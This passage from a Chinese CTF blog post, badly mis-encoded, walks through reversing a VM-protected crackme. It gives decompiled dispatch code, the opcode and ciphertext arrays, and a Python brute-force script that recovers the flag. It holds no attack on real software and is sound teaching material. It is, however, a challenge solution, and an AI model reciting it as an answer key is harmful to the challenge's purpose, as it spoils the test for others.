class="number">122</span>]</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ†æ vm opreadéƒ¨åˆ†ã€‚æ˜¯å…¸å‹çš„VM switchç»“æ„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl <span class="title function_ invoke__">vm_operad</span>(<span class="keyword">int</span> *a1, <span class="keyword">int</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  char op_code[<span class="number">200</span>]; <span class="comment">// [esp+13h] [ebp-E5h] BYREF</span></span><br><span class="line">  char v4; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+E4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> op_index; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  op_index = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = op_index;</span><br><span class="line">    <span class="keyword">if</span> ( op_index &gt;= a2 )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">switch</span> ( a1[op_index] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        op_code[v7] = v4;</span><br><span class="line">        ++op_index;</span><br><span class="line">        ++v6;</span><br><span class="line">        ++v8;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v4 = a1[op_index + <span class="number">1</span>] + op_code[v8];</span><br><span class="line">        op_index += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = op_code[v8] - <span class="title function_ invoke__">LOBYTE</span>(a1[op_index + <span class="number">1</span>]);</span><br><span class="line">        op_index += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v4 = a1[op_index + <span class="number">1</span>] ^ op_code[v8];</span><br><span class="line">        op_index += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4 = a1[op_index + <span class="number">1</span>] * op_code[v8];</span><br><span class="line">        op_index += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++op_index;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( op_code[v8] != a1[op_index + <span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="title function_ invoke__">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">          <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">        op_index += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        op_code[v5] = v4;</span><br><span class="line"></span><br><span class="line">        ++op_index;</span><br><span class="line">        ++v5;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        <span class="title function_ invoke__">read</span>(op_code);</span><br><span class="line">        ++op_index;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        v4 = op_code[v8] - <span class="number">1</span>;</span><br><span class="line">        ++op_index;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v4 = op_code[v8] + <span class="number">1</span>;</span><br><span class="line">        ++op_index;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="comment">//è¯¥ä»£ç ç»è¿‡é˜…è¯»ç†è§£å¯¹å˜é‡è¿›è¡Œäº†é‡å‘½å</span></span><br><span class="line"><span class="comment">//å­—ç¬¦æ•°ç»„æ˜¯ç”¨æ¥å­˜å‚¨op_codeçš„ åœ¨æ¯ä¸ªcaseä¸­éƒ½å‡ºç°çš„å˜é‡åº”è¯¥æ˜¯æŒ‡é’ˆç´¢å¼•</span></span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹è¿™äº›case æˆ‘ä»¬å‘ç°å¯ä»¥åˆ†ä¸ºä¸‰ç±»</p><p><strong>ç¬¬ä¸€ç±»ï¼šéªŒè¯ç±»</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">       <span class="keyword">if</span> ( op_code[v8] != a1[op_index + <span class="number">1</span>] )</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="title function_ invoke__">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">         <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       ++v7;</span><br><span class="line">       op_index += <span class="number">2</span>;</span><br><span class="line">       <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯æŠŠè¾“å…¥çš„å­—ç¬¦ä¸²ç»è¿‡ä¸€ç³»åˆ—æ“ä½œä¹‹åå­˜åˆ°äº†<code>opcode</code>ä¸­</p><p><strong>ç¬¬äºŒç±»ï¼šå­—ç¬¦å¤„ç†</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  v4 = a1[op_index + <span class="number">1</span>] + op_code[v8];</span><br><span class="line">  op_index += <span class="number">2</span>;<span class="comment">//åŠ æ³•</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">  v4 = op_code[v8] - <span class="title function_ invoke__">LOBYTE</span>(a1[op_index + <span class="number">1</span>]);</span><br><span class="line">  op_index += <span class="number">2</span>;<span class="comment">//å‡æ³•</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">  v4 = a1[op_index + <span class="number">1</span>] ^ op_code[v8];</span><br><span class="line">  op_index += <span class="number">2</span>;<span class="comment">//å¼‚æˆ–</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">  v4 = a1[op_index + <span class="number">1</span>] * op_code[v8];</span><br><span class="line">  op_index += <span class="number">2</span>;<span class="comment">//ä¹˜æ³•</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">  v4 = op_code[v8] - <span class="number">1</span>;</span><br><span class="line">  ++op_index;<span class="comment">//è‡ªå‡</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">  v4 = op_code[v8] + <span class="number">1</span>;</span><br><span class="line">  ++op_index;<span class="comment">//è‡ªå¢</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p><strong>ç¬¬ä¸‰ç±»ï¼šå…¶ä»–æ“ä½œ</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        op_code[v7] = v4;</span><br><span class="line">        ++op_index;</span><br><span class="line">        ++v6;</span><br><span class="line">        ++v8;</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//èµ‹å€¼æ“ä½œ</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++op_index;</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//å•¥ä¹Ÿä¸å¹²æŒ‡é’ˆ++</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        op_code[v5] = v4;</span><br><span class="line">        ++op_index;</span><br><span class="line">        ++v5;</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//å˜é‡èµ‹å€¼</span></span><br></pre></td></tr></table></figure><p>è¿›ä¸€æ­¥åˆ†ææˆ‘ä»¬å‘ç°ï¼šv5 v6 v7  v8æ˜¯æ•°ç»„çš„ç´¢å¼•ï¼Œv4ä¸ºæ“ä½œçš„è¿”å›å€¼.è¿™æ ·switchå°±åˆ†æçš„å¾ˆæ˜äº†äº†ã€‚ä¸‹é¢å›è¿‡å¤´æ¥çœ‹ä¸€çœ‹op_codeã€‚å‘ç°åœ¨æ¯”è¾ƒæ“ä½œæ•°7ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ä¹‹åï¼Œéƒ½æ˜¯ä¸€äº›æ— æ•ˆæŒ‡ä»¤(å¤§äº12)ï¼Œæ‰€ä»¥ï¼ŒåŠ å¯†è¿ç®—åº”è¯¥æ˜¯åœ¨æ“ä½œæ•°7ç¬¬ä¸€æ¬¡å‡ºç°ä¹‹å‰å®Œæˆã€‚å› æ­¤æœ‰æ•ˆçš„opcodeåº”è¯¥æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">10</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, </span><br><span class="line"><span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line"> <span class="number">3</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">32</span>, </span><br><span class="line"><span class="number">1</span>, <span class="number">2</span>, <span class="number">81</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>,</span><br><span class="line"> <span class="number">8</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">54</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">32</span>, <span class="number">8</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">1</span>, </span><br><span class="line"><span class="number">2</span>, <span class="number">65</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>åˆ†æå‰©ä½™çš„éƒ¨åˆ†ã€‚æ—¢ç„¶case7æ˜¯å¯¹æ•°æ®è¿›è¡ŒéªŒè¯ã€‚é‚£ä¹ˆ7åé¢è·Ÿç€çš„å°±æ˜¯åŠ å¯†åçš„å­—ç¬¦ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span>,<span class="number">34</span>,<span class="number">7</span>,<span class="number">63</span>,<span class="number">7</span>,<span class="number">52</span>,<span class="number">7</span>,<span class="number">50</span>,<span class="number">7</span>,<span class="number">114</span>,<span class="number">7</span>,<span class="number">51</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">24</span>,<span class="number">7</span>,<span class="number">4294967207</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">49</span>,<span class="number">7</span>,<span class="number">4294967281</span>,<span class="number">7</span>,</span><br><span class="line"><span class="number">40</span>,<span class="number">7</span>,<span class="number">4294967172</span>,<span class="number">7</span>,<span class="number">4294967233</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">30</span>,<span class="number">7</span>,<span class="number">122</span>]</span><br></pre></td></tr></table></figure><p>æ•´ç†åå¼€å§‹å†™reè„šæœ¬ã€‚ç”±äºæœ¬é¢˜é€†å‘æ¥å†™çš„è¯å®ç°æ“ä½œæ¯”è¾ƒå¤æ‚æ‰€ä»¥æˆ‘ä»¬é‡‡å–æ­£å‘éå†çš„æ€è·¯å»è¯•å‡º<code>flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">encrypts = [<span class="number">0x22</span>, <span class="number">0x3F</span>, <span class="number">0x34</span>, <span class="number">0x32</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x18</span>, <span class="number">0xA7</span>, <span class="number">0x31</span>, <span class="number">0xF1</span>, <span class="number">0x28</span>, <span class="number">0x84</span>, <span class="number">0xC1</span>, <span class="number">0x1E</span>, <span class="number">0x7A</span>]</span><br><span class="line"></span><br><span class="line">data = [[<span class="number">4</span>, <span class="number">0x10</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">4</span>, <span class="number">0x20</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">3</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">0x0B</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">0x0C</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">0x21</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">0x0B</span>, <span class="number">8</span>, <span class="number">0x0B</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">0x20</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">2</span>, <span class="number">0x51</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">0x24</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">0x0C</span>, <span class="number">8</span>, <span class="number">0x0B</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">0x25</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">2</span>, <span class="number">0x36</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">0x41</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">2</span>, <span class="number">0x20</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">0x25</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">0x20</span>, <span class="number">1</span>]</span><br><span class="line">    , [<span class="number">2</span>, <span class="number">0x41</span>, <span class="number">8</span>, <span class="number">0x0C</span>, <span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line">for_each = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;0&#x27;</span>]</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">encrypted</span>(c, li):</span><br><span class="line">    <span class="comment"># print(li)</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x &lt; <span class="title function_ invoke__">len</span>(li):</span><br><span class="line">        <span class="keyword">if</span> li[x] == <span class="number">2</span>:</span><br><span class="line">            c = c + li[x + <span class="number">1</span>]</span><br><span class="line">            x += <span class="number">2</span></span><br><span class="line">        elif li[x] == <span class="number">3</span>:</span><br><span class="line">            c = c - li[x + <span class="number">1</span>]</span><br><span class="line">            x += <span class="number">2</span></span><br><span class="line">        elif li[x] == <span class="number">4</span>:</span><br><span class="line">            c = c ^ li[x + <span class="number">1</span>]</span><br><span class="line">            x += <span class="number">2</span></span><br><span class="line">        elif li[x] == <span class="number">5</span>:</span><br><span class="line">            c = c * li[x + <span class="number">1</span>]</span><br><span class="line">            x += <span class="number">2</span></span><br><span class="line">        elif li[x] == <span class="number">11</span>:</span><br><span class="line">            c = c - <span class="number">1</span></span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">        elif li[x] == <span class="number">12</span>:</span><br><span class="line">            c = c + <span class="number">1</span></span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">        elif li[x] == <span class="number">8</span>:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">        elif li[x] == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    res = c</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(encrypts)):</span><br><span class="line">        <span class="keyword">for</span> i in for_each:</span><br><span class="line">            tmp = <span class="title function_ invoke__">encrypted</span>(<span class="title function_ invoke__">ord</span>(i), data[x])</span><br><span class="line">            <span class="keyword">if</span> tmp == encrypts[x]:</span><br><span class="line">                flag += i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&#x27;flag&#123;%s&#125;&#x27;</span> % flag)</span><br></pre></td></tr></table></figure><h2 id="0x05åè®°"><a href="#0x05åè®°" class="headerlink" title="0x05åè®°"></a>0x05åè®°</h2><p>åœ¨æˆ‘çœ‹æ¥ï¼Œvmè™šæ‹Ÿæœºä¿æŠ¤é€†å‘ï¼Œæ˜¯ä¸€ç§åˆ©ç”¨äº†è™šæ‹ŸæœºæŠ€æœ¯çš„ä¸€ç§ç‰¹æ®ŠåŠ èŠ±æŒ‡ä»¤æ–¹å¼ã€‚ç›®å‰æ¯”èµ›ä¸­ï¼Œè™šæ‹Ÿæœºé¢˜ç›®ç‰¹ç‚¹æ˜¯æ ¸å¿ƒç®—æ³•ä¸æ˜¯å¾ˆå¤æ‚ï¼Œè™šæ‹Ÿæœºæœ¬èº«æ²¡æœ‰åè°ƒè¯•å’Œä»£ç åŠ å¯†æ··æ·†çš„åŠ å…¥ã€‚å¤§éƒ¨åˆ†é¢˜ç›®çš„æ€è·¯éƒ½æ˜¯è€ƒå¯Ÿåˆ†æswitchè¯­å¥åŠå…¶åˆ†æ”¯ã€‚å½“ç„¶ï¼Œéšç€æ•´ä½“CTFæ°´å¹³çš„ä¸æ–­è¿›æ­¥ï¼Œæœªæ¥è™šæ‹Ÿæœºé€†å‘éš¾åº¦åªä¼šè¶Šæ¥è¶Šé«˜ã€‚</p><p>è¿™ä¸¤å¤©åº”è¯¥ä¼šå†™å‡ºç³»åˆ—çš„ç¬¬äºŒç¯‡æ–‡ç« ï¼Œå›´ç»•vmè™šæ‹Ÿæœºé€†å‘è¿›é˜¶æ“ä½œã€‚ä»¥åŠç½‘é¼æ¯é¢˜ç›®çš„æ›´å¤šè§£æ³•æ€è·¯è®¨è®ºï¼ˆåˆ©ç”¨angrï¼‰æ•¬è¯·æœŸå¾…</p><h2 id="0x06å‚è€ƒé“¾æ¥"><a href="#0x06å‚è€ƒé“¾æ¥" class="headerlink" title="0x06å‚è€ƒé“¾æ¥"></a>0x06å‚è€ƒé“¾æ¥</h2><p><a href="https://www.cnblogs.com/nigacat/p/13039289.html">https://www.cnblogs.com/nigacat/p/13039289.html</a></p><p><a href="https://www.freebuf.com/column/174623.html">https://www.freebuf.com/column/174623.html</a></p><p><a href="https://xz.aliyun.com/t/3851">https://xz.aliyun.com/t/3851</a></p><p><a href="https://blog.csdn.net/weixin_43876357/article/details/108570305">https://blog.csdn.net/weixin_43876357/article/details/108570305</a></p><p><a href="https://blog.csdn.net/weixin_45055269/article/details/105940348">https://blog.csdn.net/weixin_45055269/article/details/105940348</a></p><p><a href="https://blog.csdn.net/lhk124/article/details/108946313">https://blog.csdn.net/lhk124/article/details/108946313</a></p><p><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/78884187">https://blog.csdn.net/xiangshangbashaonian/article/details/78884187</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;é‚£CTFï¼Œé‚£VMreï¼Œé‚£äº›äº‹ï¼ˆä¸€ï¼‰&quot;&gt;&lt;a href=&quot;#é‚£CTFï¼Œé‚£VMreï¼Œé‚£äº›äº‹ï¼ˆä¸€ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;é‚£CTFï¼Œé‚£VMreï¼Œé‚£äº›äº‹ï¼ˆä¸€ï¼‰&quot;&gt;&lt;/a&gt;é‚£CTFï¼Œé‚£VMreï¼Œé‚£äº›äº‹ï¼ˆä¸€ï¼‰&lt;/h3&gt;&lt;p&gt;  vmè™šæ‹Ÿæœºä¿æŠ¤é€†</summary>
      
    
    
    
